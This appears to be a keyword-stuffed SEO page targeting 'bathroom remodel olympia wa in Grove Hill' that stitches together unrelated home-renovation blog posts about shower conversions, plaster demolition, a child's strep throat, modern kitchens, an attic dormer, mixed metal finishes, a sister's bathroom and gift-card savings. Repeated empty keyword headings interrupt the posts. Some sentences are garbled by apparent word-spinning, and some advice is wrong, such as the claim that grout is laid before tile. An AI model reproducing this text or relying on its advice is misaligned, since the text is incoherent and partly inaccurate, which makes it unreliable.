of mortar&#x2013; then tile&#x2013; completes the task.</p>   <p>Curbless showers utilize specially-made pans created to fit flush with the surrounding subfloor so that tile can be laid continually over both the shower and bathroom floor.</p>   <p>If your floor is slab, you&#x2019;ll have to get rid of an area of the piece to make room for the pan. That&#x2019;s a noisy, messy job, but a concrete professional needs to be able to do the operate in two to three hours.</p>   <p>If not, an alternative is to cut down the tops of the floor joists so that you can set up a shower pan slightly listed below the level of your existing flooring. That method, the tile of your new shower will be flush with your existing floor covering and you&#x2019;ll have a continuous, smooth floor.</p>   <p>Remodel San Diego will help you with your design ideas and help you with your bathtub to shower conversion from start to finish.</p>   <h2>What&#x2019;s the Cost?</h2>   <p>Shower stall kits with acrylic or fiberglass sides and a hinged door are approximately $200 to $2,000; curbless one-piece shower enclosures are $2,000 to $4,000. A qualified DIYer can set up a kit in a weekend.</p>   <p>An expertly installed, tiled shower enclosure is $1,000 to $3,500 depending on intricacy, size, and the type of tile and fixtures you select. Include another $500 to $1,000 for tear-out, new plumbing pipes, components, and any customized woodworking.</p>   <p>For more information on the type of bathroom renovation services we offer click here.</p>   <p><strong>Choose the unbeatable San Diego tub to shower conversion contractors.

Actually, the bathroom is in the bag &#x2013; the garbage bag. Lots of them. Our house is from the 50s, so the walls are 1&#x2033; thick plaster. And plaster is heavy. <strong>Really heavy.</strong> We took out 23 bags, each weighing about 75 pounds for a total of about 1700 pounds. I am scrawny, so tomorrow, I will be sore.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>We also discovered a lot of rot. The wall that Mrs. 1500 is fighting with in the photo below was half rotted out.

I&#x2019;ll tell you: getting our older daughter (C) to take oral antibiotics. C&#xa0;was diagnosed with strep throat today and I&#x2019;m convinced there is nothing she likes less than ingesting medicine. Combine that with amazing stubbornness (my genes, I confess) and you have a recipe for sitting there for 45 minutes, egging her on.</p>   <p>C was up all last night with a sore throat. I was already dead tired , so now I&#x2019;m feeling downright delirious with exhaustion. Seriously, you ever get so tired that you can&#x2019;t remember things people told you 20 seconds ago? That is how I am now. The brain just isn&#x2019;t working. But the show must go on.</p>   <h3><strong>Tomorrow</strong></h3>   <p>I&#x2019;m not as far ahead as I&#x2019;d like to be, but worse things have happened. On Tuesday, I hope to remove the tub, install the shower, hang drywall and get the plumbing fixed.

   <div>   <h1>Find Your Modern Kitchen Design Here!</h1>   <p>Modern kitchens are characterized by minimalism and clean uncluttered lines. High gloss cabinetry and stone benchtops are also hallmarks of modern kitchens. High end modern kitchens are often very large in large open plan settings. There are many ideas that can be adapted from these large high end modern kitchen designs to suit your space.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>High end modern kitchens often feature a large island bench with a stone bench top and waterfall edges (where the stone continues from the bench top to the floor). This idea can be incorporated into most kitchens and it is a great way to create a great food preparation and entertaining area. A few stools create an awesome spot for guest to sit and talk to you while you cook or mix drinks!</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Lighting is an essential tool in a modern kitchen to add warmth and make it a truly inviting space. Above the island benches that often feature in modern kitchens are usually three or four pendant lights. The pendants are a great decorative light, and you can have less pendants or smaller pendants depending on your space.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>As well as pendants ensure you have sufficient task lighting in your kitchen. Under cupboard lights and ceiling down lights are a great way to have light from a few different sources to prevent shadows and ensure you have plenty of light for all your kitchen tasks. It&#x2019;s a great idea to ensure all your lights are dimmable, and have your electrician add a dimmer. This will mean you can set the perfect amount of light without the risk of overpowering glare. Multiple light sources are a great way to add atmosphere, stop glare and add that perfect finishing touch to your kitchen!</p>   <h2>Thanks for stopping by our Modern Kitchens gallery, page navigation is at the bottom.

   <div>   <p>Some of the good news we&#x2019;ve had in the past month is that our plans for the attic were approved by the village &#x2014;&#x97; no changes required. Yippee!</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Back in January, I outlined all the we were running into. In general, what seemed like hindrances have turned out for the better.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>We contacted the architect and went over everything. Yes, it did cost us a little more to make changes at this stage, but it will be well worth it in the end. Maybe we could have avoided the additional cost if we had spoken to some contractors after the first sketch phase and before he drew up final plans. Another one of those things where you think you&#x2019;re covering all the bases only to find out in the end you didn&#x2019;t.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>We did move the dormer to the south side of the house, which overlooks our patio and side yard and will extend to the exterior brick, thus alleviating the structural issues we were encountering with setback rules on the north side. This dormer will house the master bedroom and bathroom. </p>   <p>Initially, I didn&#x2019;t want the bathroom to be &#x201c;en suite&#x201d;, but in order to have the bathroom accessible from the hallway we would have lost in-room access to a closet. The other upstairs room won&#x2019;t be a bedroom as long as we live here, so to fulfill our needs it won&#x2019;t be a shared bathroom and we&#x2019;ll have sufficient closet space in the bedroom.</p>   <p>While that closet will be tucked into the kneewall, two other closets will be full ceiling height and will flank a large window in the dormer addition, thereby creating a much-desired window seat that will overlook our garden.</p>   <p>The bathroom will be small and nothing fancy: toilet, a single sink and shower. The shower will be large with a built-in bench, however, and I&#x2019;m hoping to get some nice shower fixtures to bring a little more luxury to it.</p>   <p>The new location for the bathroom places it over the kitchen instead of the first floor bathroom. Since we have to open the kitchen wall to expand the staircase, this will make it a little easier to run pipes. The downside to this is that the sewer line is still on the north side of the house.</p>   <p>The upside is that we&#x2019;ll go through with my plan to in the main floor bathroom in order to run the waste pipe to the sewer stack. I have an idea that would make it a relatively inexpensive and fairly easy remodel, and one that I can live with for a long time.</p>   <p>Using a principle outlined in the book by Sarah Susanka, we would also drop the ceiling in the hallway. According to Susanka, dropping the ceiling in a hallway like this defines the rooms beyond and makes them feel more open. </p>   <p>From a utilitarian aspect, by dropping the ceiling we can easily run the waste pipe from the second floor bathroom across the hallway ceiling and over to the first floor bathroom wall and sewer pipe.</p>   <p>The roughed-in plumbing to the second floor, which the PO did, will not go to waste and will be used to supply the small laundry and utility room on the other side of the staircase.</p>   <p>All-in-all, I&#x2019;m much happier with these changes.</p>   <p>As far as the floor joists go, the final determination is that the span <em>for our particular project</em> is within the maximum horizontal width allowed for sleeping spaces. This doesn&#x2019;t mean that we won&#x2019;t be sistering joists where necessary, such as the bathroom and in the dormer area.</p>   <p>We&#x2019;ve narrowed it down to a couple of contractors, so I hope we&#x2019;ll make a final decision very soon. We could be starting on this in the very near future!</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

   <div>   <p>I recently blogged about my upcoming plans for our master bathroom makeover and mentioned I was going to attempt to do something that scares many..mixing metals.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>For years, it has been thought that&#xa0;consistency&#xa0;in metals is a must and mixing is a no-no. &#xa0; I recently ran across an article who compared this stigma we have about sticking with one metal finish being similar to the days of going to a furniture store and buying a matching set. &#xa0;I couldn&#x2019;t agree more, the days of matching are long behind us, mixing it up is way more fun. &#xa0;While this is my first attempt at mixing metals I&#x2019;m ready to take the plunge.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I have mixed metals all through up my home, often unintentional, but in a bathroom where metal is so&#xa0;prevalent continuity seems to be king. &#xa0;I decided to round up some photos I found where mixing metals works beautifully in hopes of inspiring a few of you to walk the line with me.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <div>    <small> by </small>   </div>   <p>I don&#x2019;t believe in decorating &#x201c;rules&#x201d;, but here are a few tips that might help the newbie metal mixers out there.</p>   <p>Start small and only mixing two at a time. &#xa0; While I am sure you could round up some photos where this has been proven otherwise, I think its a good choice for us&#xa0;beginners. &#xa0; Let the professional metal mixers dare to mix more.</p>   <p>Let your&#xa0;preferred&#xa0;metal finish be your base for expensive, harder to replace things like your faucets and lighting, and test your metal mixing boundaries with things like vanity hardware, mirrors, and decorative items that easily be replaced.</p>   <p>Keep&#xa0;consistency&#xa0;among specific items. &#xa0;For instance, I wouldn&#x2019;t suggest having oil-rubbed bronzed sink faucets and a nickel shower head. &#xa0;Try to keep all lighting one finish, all towel bars the same, all faucets the same, etc.</p>   <p>What are your thoughts on mixing metals? &#xa0;Have you done it before and succeeded? &#xa0;Still think a bathroom in one finish is the way to go?</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <div>   <p>My sister moved back to our home town about a year ago after her husband passed away from&#xa0;battling cancer for 2 years. She bought a new, old home about three blocks away from us. Now we not only get to speak to each other every day, but we get to see each other every day, too.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Funny story &#x2013; My sister&#x2019;s&#xa0;two dogs, Bailey and Roxie, move freely back and forth between our two new, old homes. Roxie stays with us most of the time, and Bailey is attached to my sister. Very attached. My sister decided to proceed with some home renovations and left the house one day to run an errand while the contractors were there. They inadvertently let Bailey out of the house, and he ran off.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Meanwhile, DSH was working outside at our new, old home when Bailey appeared at his side. We were baffled and tried calling and texting my sister, but there was no answer. In the meantime, the poor contractors were scouring the neighborhood trying to find the escapee.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The little &#x201c;Shit-zhu&#x201d; (That&#x2019;s what I call him &#x2013; he&#x2019;s a Pug / Shih Tzu mix, and I also tell him that if he weren&#x2019;t so cute, he&#x2019;d be dead.) had managed to find his way the three blocks, across a very busy road, to our new, old home looking for my sister or escaping from those nasty old contractors. He wanted&#xa0;<em>nothing</em> to do with those guys!</p>   <p>My sister started the renovations on her new, old home by converting the screened in porch to a true three-season room. Her second renovation involved changes to the upstairs bathroom. She wanted to make a few minor modifications which turned into a more involved project than expected. Isn&#x2019;t that always the case?</p>   <p>What they discovered is the pan to the shower was cracked and had been leaking for who knows how long resulting in a little mold problem. The entire shower had to be torn out as well as the wall board which was replaced with the correct type for bathrooms. A few day project lasted a little longer, but, thankfully, she has a bathroom in the basement. She got her stair-stepper exercises!</p>   <p>After this problem was found and repaired, she was able to get back to the <em>minor</em> changes including&#xa0;adding&#xa0;new tile to the shower and around the vanity to match the existing black and white subway tile on the floor. She also replaced the top on the vanity which was a converted antique dresser. They removed the wood top and added a piece of black granite.</p>   <p>After the contractors were done with this work, my sister proceeded to do the painting and decorating. She decided on pink for the color theme for her newly updated bathroom, and it turned out really cute!</p>   <p>While we were out visiting antique stores one day, I spotted this beautiful linen tablecloth with pink flowers embroidered on it. It was in pristine condition and was listed for $14. I felt it would make a beautiful drapery for her new bathroom.</p>   <p>I added a rod pocket using some fabric that we already had and . . .</p>   <p>Voila! A beautiful linen tablecloth has been re-purposed into a beautiful drapery for my sister&#x2019;s new, old bathroom.</p>   <p>Here it is installed. We used a very light pink sheer that we re-purposed from&#xa0;one of my daughter&#x2019;s old bedrooms. It is draped on one side and the linen drapery nee tablecloth is draped the other direction. The tie backs are pieces of silver costume jewelry that belonged to my sister&#x2019;s mother-in-law.</p>   <p>My sister has an antique mirror collection that used to reside on the wall of a bedroom in her old home. They look perfect in her newly remodeled bathroom.</p>   <p>I love the little sign that goes with them! So whimsical!</p>   <p>The contractor made an error in cutting the corner piece for the shower, so my sister re-purposed it as a corner shelf next to the old-fashioned freestanding tub. There is a jar of shells from her travels as well as two old ceramic pieces from her mother-in-law.</p>   <p>She put an antique hall tree in the space on the other side of the tub. It includes an antique plate holding an antique curling iron. She also has a place to display a Chinese fan given to her by a friend.</p>   <p>My sister had this sampler from many years ago, and it fits perfectly over the tub.</p>   <p>Here is the antique dresser which was in place when she move into the house. She replaced the top with a piece of black granite and a black and white backsplash carried over&#xa0;from the tiling in the shower. Both features tie in nicely with the black and white subway tile flooring.</p>   <p>She added a new mirror that blends old and new styles. What you cannot see is that she painted the insides of the drawers with a bright lime green color. The bright color adds whimsy and also makes the insides of the drawers easier to clean.</p>   <p>The glass shelf to the right of the vanity mirror holds my sister&#x2019;s&#xa0;husband&#x2019;s baby cup containing some Q-tips, and another antique mirror ties the theme from the other wall. The jar is full of black and white hat pins which is something that my sister collects in homage to our paternal grandmother and her sisters who owned a millinery shop in Chicago in the early 1900s.</p>   <p>Here is a picture of our grandmother wearing one of her <em>fascinating</em> hats. I talked about the millinery shop and my grandmother .</p>   <p>The upstairs bathroom includes a doorway into the room that was converted into a master bedroom closet.</p>   <p>My sister tied back the sheer with an old handkerchief, embroidered in pink with the letter &#x201c;D&#x201d; for her first name. So, so cute.</p>   <p>One of the nice features of my sister&#x2019;s master bedroom closet is an extra sink which she can use if someone else is using the one and only upstairs bathroom. Love the use, again, of an antique dresser for a vanity.</p>   <p>We are really enjoying re-using and re-purposing stuff we already own or find in our new, old homes, and I really love my sister&#x2019;s newly remodeled and decorated bathroom, don&#x2019;t you?</p>   <div>    <h3><em>Related</em></h3>   </div>   <div>    <div>     <h3>Share on Facebook</h3>    </div>   </div>  </div>

   <div>   <p>Do you know that feeling when you put on a jacket you haven&#x2019;t worn in ages, put your hand in the pocket, and pull out a $20? It&#x2019;s the best, right?&#xa0; Kev and I had that happen to us this weekend&#x2026; except the jacket was a dresser drawer and the $20 was two gift cards.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>The first gift card was to Lowe&#x2019;s and Kevin used it to buy a 20V DeWalt jig saw. Woot.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The second was a $50 gift card was to Pottery Barn&#x2026; which got the wheels in my head a-turnin&#x2019;.&#xa0; I have been coveting from Pottery Barn pretty much since we decided to remodel the bathroom. But at $250, it was more of a splurge than I was willing to make, especially when Home Depot has a for $109.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p> ()</p>   <p>Now I had $50 off that $250.&#xa0; Things were starting to look more attractive. And then yesterday morning when I got an email from Pottery Barn for 20% off a single item, I knew it was a sign from God (assuming God busies himself with things like Pottery Barn sales and bathroom renovations).</p>   <p>With the $50 gift card and the 20% off, the cabinet was down to $150.&#xa0; As usual, we checked Gift Card Zen and scored just the right amount of discount gift cards to get us another 8% off, meaning we paid just $138 before tax.&#xa0; I won&#x2019;t lie, I did my happy dance when Kevin wasn&#x2019;t looking.</p>   <p>All in all, we saved $112 on the medicine cabinet. If you combine that with the $186.85 we saved on our , we&#x2019;ve saved <strong><span>$298.85</span></strong> so far on our bathroom renovation!</p>   <p>This has inspired us to add a new goal for our bathroom remodel:</p>   <p><strong><span>Save $1000 on what we were already planning to purchase for the remodel by getting creative with sales, coupons, and discount gift cards</span></strong>.</p>   <p>It&#x2019;s an ambitious goal since we don&#x2019;t have <em>too</em> <em>many</em> major purchases left, but I know we can do it.

   <div>   <p>The bathroom in the Pink Paradise (1972 Frolic) was in horrible shape and it has required (almost) a complete tear out and rebuild.&#xa0; It needed some new studs, insulation, wallboard, plumbing, and electrical work.&#xa0; Some of which we are still in progress of finishing.&#xa0; But in the meantime, I thought I&#x2019;d give you a little glimpse of before and during.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Frolic bathroom (above) before cleaning.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Frolic bathroom (above) after cleaning.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Frolic bathroom (above) during tear out.</p>   <p>Frolic bathroom (above) after tear out.</p>   <p>Frolic bathroom (above) with new insulation.</p>   <p>Frolic bathroom (above) with new studs, Luan plywood, electrical work, and insulation.</p>   <p>Working in there hasn&#x2019;t been what I&#x2019;d call a real joy either.

   <div>   <p>Yesterday I shared and realized that I hadn&#x2019;t shared the finished Bathroom Remodel.&#xa0; Yikes!&#xa0; It has definitely been a crazy summer!</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>[pinterest]</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>This all started back in May.&#xa0; You can see what it looked like before .</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I even had a on .&#xa0; Which by the way was a great way for me to convey to my contractor what I wanted done.&#xa0; Oh, we hired this out.&#xa0; Keith and I are not DIY&#x2019;ers and with what we wanted done, we needed someone that knew what they were doing.</p>   <p>So, let me say I am just thrilled with the results.&#xa0; The bathroom footprint could not be changed and it is small.&#xa0; What I needed was something fresh with as much storage as possible.&#xa0; Mission accomplished.</p>   <p>We retiled the floor and inside the tub area.&#xa0; We removed the tile from the bottom of the walls and added a&#xa0;board and batten finish.&#xa0; The upper walls and ceiling were painted two different shades of light gray with the darker on the wall and lighter on the ceiling.&#xa0; We replaced the old vanity lights and added a fan with light along with electrical outlets.&#xa0; Yup, this puppy did not have any electrical outlets.</p>   <p>We replaced the toilet with a newer, more efficient model in white (no more beige) and added a bigger vanity with these two pieces from .&#xa0; I had wanted to have something custom built because I wanted a hamper on the side of the vanity and my contractor found these for me and saved me lots of money.&#xa0; I made the storage&#xa0;cabinet on the right into a hamper and shared that on the blog .</p>   <p>The basket is from Walmart.&#xa0; It matches some others that I am using and it allows Keith to have a place to store his razor and charger without them being out in the open.&#xa0; Behind the plant (which is one of the many that I received while I was in the hospital) is our electrical outlet.&#xa0; The plant is surviving so far.&#xa0; Between Pixie, Dixie and me, most plants don&#x2019;t do well in our house.</p>   <p>Above the vanity we had our contractor take our old medicine cabinet and totally revamp it by recessing it into the wall. Previously it was mounted on the wall and had quite a bit of decorative trim around it.&#xa0; Placing it in the wall and removing all that trim gave us about&#xa0;6 extra inches of personal space above the sink.&#xa0; It makes a huge difference.</p>   <p>And here is he lighting we chose from Home Depot.&#xa0; The lighting is much better than the old fixture we had.</p>   <p>I told you that I needed more storage? Well, our contractor built this cute little cabinet for us&#xa0;just for that purpose.&#xa0; He modeled it after one that I had pinned and mounted it to look like it was an old add on from long ago.</p>   <p>It is perfect for storing extra rolls or TP and other little essentials.</p>   <p>The shelf is adjustable.&#xa0; The cotton balls are stored in an old jar that Keith has owned forever.&#xa0; The old glass liquor decanter stores mouthwash and the little crystal jar houses Q-tips.</p>   <p>He added a towel rack, too.&#xa0; And that little crystal dish with matches&#xa0;on the toilet was picked up at the same yard sale as the other crystal dish and glass decanter.&#xa0; I got a box of crystal and glass for $5 and you know how I love to use .</p>   <p>And the top has a nice place to display things that we don&#x2019;t want Pixie and Dixie messing with.&#xa0; Like the , the Seashell D&#xe9;cor from yesterday&#x2019;s post and my cat that I brought back from Switzerland.&#xa0; He reminded me of our cat Shadow and I just had to bring him home with me.</p>   <p>The hydrangeas are from last year&#x2019;s crop.&#xa0; I love how the dry to a creamy rose color.</p>   <p>The stained glass window is an old find from an antique show many years ago.&#xa0; We have had it in this window since we moved here.&#xa0; The way our bathroom is situated, you don&#x2019;t really need curtains and this old window&#x2019;s pimpled glass gives you extra privacy while letting in much needed light.</p>   <p>The Celtic pieces above are reproduction pieces I purchased on my trip to Ireland in 2007.&#xa0; Keith and I love Celtic work and for some reason they just fit here.</p>   <p>The Seashell Art on the left is the first art we did with our friends that we go to the beach with.&#xa0; We made those back in 2003, little did we know what it would lead to!&#xa0; All we did was take terra cotta clay pot bases and glue in our shells with caulk.&#xa0; We sprinkled sand on them to cover the caulk.&#xa0; Then we sprayed with sealer and that was it.</p>   <p>And to the left of those is the we made last year.</p>   <p>I love how this turned out.</p>   <p>Here you can see more of the board and batten wall finish and some of the tile floor.&#xa0; The tile has a white base with gray and tan veins running through it.</p>   <p>The floor tile has a matte finish and the matching wall tile has a glossy finish.&#xa0; We totally redid the shower plumbing, moving it from the tub to the wall.&#xa0; The tub, which is not shown, was not replaced.&#xa0; It is a nice cast iron porcelain and I did not want to replace it with fiberglass or anything else we saw that was affordable.&#xa0; We may have it re-glazed in white some day, but right now, it ties in perfectly with the hints of tan in the tile and the tan color of the manufactured stone counter tops of the vanity.</p>   <p>We did have our contractor add two little niches in the wall to give us extra space in the shower for shampoos and other items.&#xa0; And he added the ceramic soap shelves in the front corner.&#xa0; No more crazy metal pole shelves that do nothing but rust!</p>   <p>On the narrow strip of wall by the door is another of our Seaside Art pieces.&#xa0; This one showcases some of Keith&#x2019;s Shark&#x2019;s Teeth.&#xa0; Where I look for Seashells, he looks for Shark&#x2019;s Teeth.&#xa0; He has gotten really good at finding them and it is a great way to spend a couple of hours walking up and down the beach.</p>   <p>I think I found the frame at Walmart, many years ago.&#xa0; The cardstock is just some scrapbook paper with a glitter finish and then I used some rub on letters to add the beach name.</p>   <p>For towels, we decided to use hooks instead of bars.&#xa0; They take up less space and you can get more hung this way.&#xa0; We used three on this wall behind the door and two on the back of the door.</p>   <p>Speaking of the door, all of the doors in our house are original.&#xa0; And they all have this finish, which is in pretty good condition, considering the house is 50+ years old.&#xa0; Our contractor recommended we leave them since it was another way to bring in the tan, natural tone to the room.&#xa0; But, he did find my shelf inspiration on Pinterest and added&#xa0;one above the door so I could take advantage of more, much needed space. The two baskets on the ends are from Walmart, they match the one in the vanity.&#xa0; The one in the center is from Michaels and it coordinates nicely.</p>   <p>The baskets came with the little chalkboard labels attached.&#xa0; I debated on whether or not to label them, and in the end decided to rob my stash of Seashells and hot glue these on instead.</p>   <p>I found some tan colored shells and was able to make them look like little handles in a way.</p>   <p>The baskets house items that we use such as shaving gels, bath gels and hygiene products.&#xa0; They are close but out of sight.&#xa0; I usually stock up on these items when I have coupons and will have quite a bit on hand, so these baskets work really well for that purpose.</p>   <p>Well, there you have it.&#xa0; I told you it was a small room.&#xa0; But I am so happy about how it all turned out.&#xa0; Our contractor was great!&#xa0; He was able to pick out my wants from my Pinterest board and bring them to life.&#xa0; We have a brighter, fresher bathroom with more storage and it even feels like we have more space!&#xa0; We also are able to showcase personal collectibles and art in our newly remodeled bathroom!&#xa0; It took a while to finish, but it was so worth it!&#xa0; We really love it!</p>   <p>[pinterest]</p>   <pre>This is not a sponsored post, I am sharing products that I used from Lowe's, Home Depot, Walmart and Michaels.</pre>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

   <div>   <p>Updating a kitchen and making a few remodeling changes to the space is an important part of getting the most out of your home. A kitchen is a place where friends and family gather and enjoy making meals together. Having an up-to-date kitchen that looks amazing starts by simply making a few changes to the original kitchen. Depending on the preferred changes to the space, remodeling a kitchen can become a big project, but for most homes a couple of easy changes are all that is needed to update and improve the kitchen.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Sprucing up the Cabinets</strong></p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>   <p>Updating the cabinetry is often one of the easiest projects in the kitchen because it is not usually difficult to change out the wood cabinets. The exact method of removing and replacing the cabinets or updating the cabinets will depend on the particular kitchen and the type of cabinetry already in place.</p>   <p>&#xa0;</p>   <p>A home that already has beautiful cabinets that are just too dark, too light, or in need of a little improvement can opt to strip the wood, sand it, and then refinish the wood until it creates the style and look preferred. This is the simplest method of improving the cabinets and is most appropriate when the original cabinets are not a major issue in the kitchen. To change the color, wood staining is used after stripping and before using a finishing project to make the color a little darker or lighter according to personal preferences.</p>   <p>&#xa0;</p>   <p>In cases where the cabinets are not pleasing, it is necessary to take out the old cabinetry and put in the new. This project is often more involved and in many cases will require professional installation to avoid complications.</p>   <p>&#xa0;</p>   <p><strong>Changing the Flooring</strong></p>   <p>&#xa0;</p>   <p>Flooring is one of the elements in a kitchen that often shows the age of the home and space. Changing the flooring will help make the whole kitchen look amazing and updated without turning the remodeling project into a complete overhaul of the original kitchen.</p>   <p>&#xa0;</p>   <p>The exact method of changing the flooring depends on the original floor and the preferred new flooring material. Different types of floors will have various degrees of simplicity when it comes to pulling out the old floor and putting in a new floor.</p>   <p>&#xa0;</p>   <p>Despite the challenges of changing the original flooring based on variation between materials and installation, most kitchen floors are tile. Tile flooring is pulled off with an appropriate tool and then new tile is put down according to the particular directions of the material. In most cases, grout is laid down first and then the tile is placed over it, though variations in installation will exist.</p>   <p>If you want to go the easiest route, some laminate floorings snap or glue into place, which is simpler than laying down tile, slate, or similar flooring options.</p>   <p>&#xa0;</p>   <p><strong>Putting in New Appliances</strong></p>   <p>&#xa0;</p>   <p>The best way to instantly update and improve the kitchen is putting in new appliances. Putting in brand-new refrigerators, ovens, dishwashers and other large appliances will improve the look of the entire space without tearing up the kitchen. Simply changing appliances like a refrigerator will make the kitchen look different and new without labor-intensive or expensive changes to the cabinets, counters, floors, walls or other aspects of the kitchen.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Remodeling a kitchen does not necessarily mean pulling apart the entire space and changing every element. It is possible to make the kitchen look amazing with a few simple changes that update the space and are not as complicated as other projects. A kitchen is a gathering place for families and it deserves updated appliances, floors, cabinets, and other elements to feel comfortable.</p>   <p>&#xa0;</p>   <p><em>Photo credit: Kitchen remodel by Diane Reed/flickr</em></p>   <p><em>&#xa0;</em></p>   <p><em>Nancy Porter is an interior decorator and blogs on behalf of a site where you can find all sorts of helpful reviews on various brands and models of refrigerators!</em></p>  </div>

   <div>   <p><em> <strong>&#x201c;The planning and researching phases of a project are the most critical steps in the remodeling process,&#x201d;</strong></em> says NARI National President Art Donnelly</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I might add they are also the most time consuming. But proper planning and preparation can save a lot of headaches and remodeling dollars.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>A major home remodel can be a daunting task. Many homeowners don&#x2019;t realize how much work is actually involved on their end. And when trying to balance family, work, and all of life&#x2019;s other demands, trying to prepare for your remodel can be overwhelming. </p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>With such a huge investment at stake, the last thing you want is a disappointing finished product. That&#x2019;s why hiring a seasoned Design Professional can be a worthwhile investment.</p>   <p>When you&#x2019;re ready to invest the kind of money it takes to remodel your kitchen or bathroom, you&#x2019;ve no doubt waited a long time &amp; you want to do it right. How can you afford not to hire a design pro who has been putting together successful projects for years?</p>   <p>Preparation is the key to a successful project. A good designer can help you prepare by helping you to understand how the process works.</p>   <p> It&#x2019;s not uncommon for poorly prepared remodelers to wait until the last minute to make that appliance or kitchen sink selection and then find out it&#x2019;s an 8 week order. Nor is it unusual to change selections midway after all of the cabinet specs have been produced, and now that cooktop you wanted won&#x2019;t fit. The biggest mistake you can make when remodeling your kitchen or bathroom is not taking it serious enough. They are tricky &amp; require an investment of your time. Hiring a designer will help to make sure you understand what you&#x2019;re doing &amp; what you want. Each project is unique and having someone who understands your needs and knows how to fulfill them is important.</p>   <p>What&#x2019;s more expensive? Hiring a designer, getting professional direction &amp; having someone you can bounce ideas off of. Or crossing your fingers, paying for change orders &amp; not knowing if you&#x2019;re going to be happy until its done &amp; then it&#x2019;s too late!!! A successful project starts &amp; ends with the homework. A good designer will understand your vision and help you to communicate that with your prospective Contractor by creating a definitive plan and coordinating material selections. Proper preparation can simplify the process and make it fun from beginning to end. Isn&#x2019;t that the way it should be?</p>   <h3>Things to think about</h3>   <ul>    <li> Remodeling can be a huge investment and when it&#x2019;s done it&#x2019;s done. You can&#x2019;t afford to make mistakes.</li>    <li>There&#x2019;s nothing worse than being disappointed with the finished product because you have to live in it for years to come. </li>    <li>If all the homework is done, and done right, your remodel project will flow smoothly, remain on schedule, and on budget.</li>    <li>Start preparing before you meet with your prospective designer. The more you are able to communicate your ideas and tastes the more likely your designer can understand and articulate your needs to the project team.</li>   </ul>   <p>If you do plan to endeavor the preparation and selections yourself, here are some important things to consider-</p>   <p><strong>1. Having comprehensive finished drawings is a must-</strong> You&#x2019;ve been accumulating thoughts and ideas for months. Maybe even years. Being able to communicate all of these ideas to multiple project team members is crucial. Everyone needs to be on the same page and have the same end result in mind. The only way to achieve this is by having good plans professionally prepared and scrutinizing them thoroughly before the bidding process begins.</p>   <p><strong>2. Your material selections should be complimentary-</strong> Being totally sold on 4 or 5 different materials doesn&#x2019;t guarantee they will go well together. This is the most common problem I see. When the husband and wife are compromising on each others selections and when it&#x2019;s all done you have a hodge podge of mixed materials that don&#x2019;t go well together.</p>   <p><strong>3. Make material selections early-</strong> The more selections you can make prior to the bidding stages the better the chance that your project will go smoothly and stay within budget. This will also assure getting apples to apples bids if multiple bidders are involved. </p>   <p><strong>4. Remember what motivated you to do the project in the first place-</strong> Whether it was the need for more space, functionality, or just updating that outdated kitchen, keep design in mind. </p>   <p><strong>5. Stay focused-</strong> If you stray from your original intent it becomes easy to lose focus on why you&#x2019;re doing this in the first place. And when the job is done you realize that you didn&#x2019;t really get what you were 